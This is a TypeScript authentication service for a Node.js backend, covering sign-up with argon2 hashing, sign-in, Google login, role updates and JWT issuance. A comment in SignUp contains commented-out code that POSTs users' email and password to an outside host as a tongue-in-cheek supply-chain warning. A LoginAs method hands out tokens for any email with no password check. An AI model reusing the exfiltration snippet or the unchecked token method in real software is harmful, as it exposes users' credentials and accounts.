import * as argon2 from 'argon2';
import { randomBytes } from 'crypto';
import * as jwt from 'jsonwebtoken';
import { Inject, Service } from 'typedi';
import { config } from '../config';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { AppLogger } from '../loaders/logger';
import events from '../subscribers/events';
import MailerService from './mailer';

@Service()
export default class AuthService {
  private logger = new AppLogger(AuthService.name);
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    @Inject('roleModel') private roleModel: Models.RoleModel,
    private mailer: MailerService,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: Promise<string> }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      let userRecord = await this.userModel.create({
        ...userInputDTO,
        salt: salt.toString('hex'),
        password: hashedPassword,
        roles: ['5e4703d62faee61d8ede2d65'],
        currentRole: '5e4703d62faee61d8ede2d65',
      });

      // populate user role
      userRecord = await userRecord
        .populate({ path: 'roles', select: 'title' })
        .execPopulate();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      // if (!userRecord) {
      //   throw new Error('User cannot be created');
      // }
      this.logger.silly('Sending welcome email');
      await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, {user: userRecord});

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord.populate({ path: 'roles' }).toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e.message, e.stack);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
    let userRecord = await this.userModel.findOne({ email });

    // populate user role
    userRecord = await userRecord
      .populate({ path: 'roles', select: 'title' })
      .execPopulate();

    if (!userRecord) {
      throw new Error('User not registered');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      return { user, token };
    } else {
      throw new Error('Invalid Password');
    }
  }

  public async LoginAs(email): Promise<any> {
    const userRecord = await this.userModel.findOne({ email });
    this.logger.silly('Finding user record...');
    if (!userRecord) {
      throw new Error('User not found');
    }
    return {
      user: {
        email: userRecord.email,
        name: userRecord.name,
      },
      token: this.generateToken(userRecord),
    }
  }

  public async SocialLogin(profile): Promise<IUser> {
    try {
      let userRecord = await this.userModel
        .findOne({ email: profile.email })
        .populate({ path: 'roles', select: 'title' })
        .exec();

      if (!userRecord) {
        const data = profile._json;
        const userInfo = {
          googleId: profile.id,
          name: data.name,
          photo: data.picture,
          email: data.email,
          isVerified: data.email_verified,
          roles: ['5e4703d62faee61d8ede2d65'],
          currentRole: '5e4703d62faee61d8ede2d65',
        };
        userRecord = await this.userModel.create(userInfo);
        userRecord = await userRecord
          .populate({ path: 'roles', select: 'title' })
          .execPopulate();

        await this.roleModel.findOneAndUpdate(
          { _id: userRecord.roles },
          { $inc: { userCount: 1 } },
          { new: true }
        ).exec();
      }
      return userRecord;
    } catch (e) {
      this.logger.error(e.message, e.stack);
      throw new Error(
          'error while authenticating google user: ' + JSON.stringify(e)
        );
    }
  }

  public async UserProfile(id: string): Promise<IUser> {
    try {
      this.logger.debug('Fetching user details');
      const userRecord = await this.userModel
        .findById(id)
        .populate({
          path: 'roles',
          select: '_id title description resourceAccessLevels',
          populate: { path: 'resourceAccessLevels.resource resourceAccessLevels.permissions' },
        })
        .populate({ path: 'activeDevice' })
        .populate({ path: 'currentRole', select: 'title' })
        .populate({ path: 'devices' }).exec();

      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');

      return user;
    } catch (e) {
      this.logger.error(e.message, e.stack);
      throw e;
    }
  }

  public async UpdateCurrentUserRole(id: string, userDetails: IUserInputDTO): Promise<IUser> {
    try {
      this.logger.debug('Updating user role');
      let userRecord;
      // Check if role exists on user record
      userRecord = await this.userModel.findOne({ _id: { $eq: id } });

      const roleExists = userRecord.roles.includes(userDetails.role);
      if (!roleExists) {
        await this.userModel.findByIdAndUpdate(
          id,
          { $push: { roles: { $each: [userDetails.role] } } },
          { new: true });
      }

      userRecord = await this.userModel.findByIdAndUpdate(
        id,
        { currentRole: userDetails.role },
        { new: true })
        .populate({ path: 'currentRole', select: 'title' });

      // Check when a user role is removed????
      await this.roleModel.findOneAndUpdate(
        { _id: userRecord.roles },
        { $inc: { userCount: 1 } },
        { new: true }
      ).exec();

      return userRecord;
    } catch (e) {
      this.logger.error(e.message, e.stack);
      throw e;
    }
  }

  public async GetUsers(): Promise<IUser[]> {
    try {
      this.logger.debug('Fetching all user from record');
      return this.userModel
        .find()
        .populate({ path: 'roles', select: 'title' })
        .populate({ path: 'currentRole', select: 'title' });
    } catch (e) {
      this.logger.error(e.message, e.stack);
      throw e;
    }
  }

  public async deserializeUser(email: string) {
    const userRecord = await this.userModel.findOne({ email });
    this.logger.silly('Finding user record...');

    if (!userRecord) throw new Error('User not found');

    return userRecord;
  }

  public generateToken(user: IUser) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     */
    const role = user.roles.reduce((obj, role) => Object.assign(obj, { [role.title]: role._id }), {});

    const userData = {
      role,
      _id: user._id, // We are gonna use this in the middleware 'isAuth'
      name: user.name,
      photo: user.photo,
      email: user.email,
      isVerified: user.isVerified,
      deviceVerified: ((user.devices.length >= 1) ? user.devices[0].verified : false),
      activeDevice: user.activeDevice,
    };

    return jwt.sign(
      {
        userData,
        iat: Date.now(),
        exp: exp.getTime() / 1000,
        iss: 'almond.com',
        aud: 'almond users'
      },
      config.jwtSecret,
    );
  }
}
